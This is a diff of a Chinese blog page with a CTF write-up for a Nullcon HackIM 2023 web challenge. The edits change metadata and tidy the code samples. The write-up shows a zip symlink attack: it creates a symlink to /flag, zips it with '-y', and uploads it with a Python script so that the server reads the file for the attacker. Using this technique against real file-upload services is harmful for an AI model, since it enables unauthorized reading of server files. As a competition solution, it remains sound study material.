@@ -276,8 +276,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="pc">2023-03-12 16:25:26</span>
-            <span class="mobile">2023-03-12 16:25</span>
+            <span class="pc">2023-03-13 07:45:39</span>
+            <span class="mobile">2023-03-13 07:45</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -299,7 +299,7 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-file-word"></i>&nbsp;<span>908 字</span>
+            <i class="fa-regular fa-file-word"></i>&nbsp;<span>912 字</span>
         </span>
     
     
@@ -328,7 +328,7 @@
 <p>我们可以访问上面生成的那个文件，限制了 path 为&#x2F;tmp&#x2F;data&#x2F;&lt;生成的目录名&gt; 的格式，所以并不能直接访问到 flag 目录</p>
 <p>参考解答：<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups/blob/main/README.md" >Nullcon-HackIM-CTF-2023-writeups&#x2F;README.md at main · Ramalingasamy012&#x2F;Nullcon-HackIM-CTF-2023-writeups (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>用到了软链接的一些特性：<br>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式<br>2.软链接可以 跨文件系统<br>3.软链接可以对一个不存在的文件名进行链接<br>4.软链接可以对目录进行链接</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln [参数][源文件或目录][目标文件或目录]</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln [参数][源文件或目录][目标文件或目录]</span><br><span class="line"></span><br><span class="line">-s 软链接(符号链接)</span><br></pre></td></tr></table></figure></div>
 
 <p>对于zip命令，有一个<code>-y</code></p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b &lt;工作目录&gt;][-ll][-n &lt;字尾字符串&gt;][-t &lt;日期时间&gt;][-&lt;压缩效率&gt;][压缩文件][文件...][-i &lt;范本样式&gt;][-x &lt;范本样式&gt;]</span><br><span class="line"></span><br><span class="line">-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。</span><br></pre></td></tr></table></figure></div>
@@ -338,7 +338,7 @@
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag.txt</span><br><span class="line">zip -y flag.zip flag.txt</span><br></pre></td></tr></table></figure></div>
 
 <p>python构造并发送请求</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://52.59.124.14:10015&quot;</span></span><br><span class="line">files=&#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;C:/Users/24047/Desktop/flag.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">res=requests.post(url,files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://52.59.124.14:10015&quot;</span></span><br><span class="line">files=&#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">res=requests.post(url,files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div>
 
 <p>最后访问falg.txt即可</p>
 <p>参考：<br><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html" >Linux 命令大全 | 菜鸟教程 (runoob.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups/blob/main/README.md" >Nullcon-HackIM-CTF-2023-writeups&#x2F;README.md at main · Ramalingasamy012&#x2F;Nullcon-HackIM-CTF-2023-writeups (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
